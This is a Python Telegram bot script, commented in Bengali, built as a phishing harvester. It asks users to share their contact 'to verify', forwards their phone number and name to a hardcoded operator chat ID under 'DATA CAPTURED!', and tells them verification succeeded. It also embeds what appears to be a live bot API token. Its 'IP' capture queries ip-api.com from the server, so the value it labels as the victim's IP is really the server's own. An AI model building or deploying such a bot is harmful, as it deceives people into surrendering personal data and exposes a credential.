import telebot
import requests
import os
import time
from threading import Thread
from flask import Flask

# ১. রেন্ডারকে সচল রাখার জন্য সার্ভার
app = Flask('')

@app.route('/')
def home():
    return "Bot is active!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ২. বটের মেইন কনফিগারেশন
API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
MY_ID = '8046944525'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please share your contact to verify.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    try:
        # IP এবং লোকেশন বের করা
        response = requests.get("http://ip-api.com/json/", timeout=10).json()
        ip = response.get("query", "N/A")
        
        text = "🚀 **DATA CAPTURED!**\n\n"
        text += f"📱 **Phone:** `{message.contact.phone_number}`\n"
        text += f"👤 **Name:** {message.contact.first_name}\n"
        text += f"🌐 **IP:** `{ip}`"
        
        # আপনার আইডিতে তথ্য পাঠানো
        bot.send_message(MY_ID, text, parse_mode="Markdown")
        # ইউজারকে কনফার্মেশন দেওয়া
        bot.send_message(message.chat.id, "✅ Verification Successful!")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # ওয়েব সার্ভার চালু করা
    Thread(target=run).start()
    
    # ৩. জট কাটানোর জন্য বিশেষ ধাপ
    print("Cleaning old sessions...")
    bot.remove_webhook()
    time.sleep(1) # টেলিগ্রামকে সময় দেওয়া
    
    print("Bot is starting...")
    bot.infinity_polling(none_stop=True, timeout=60, long_polling_timeout=20)
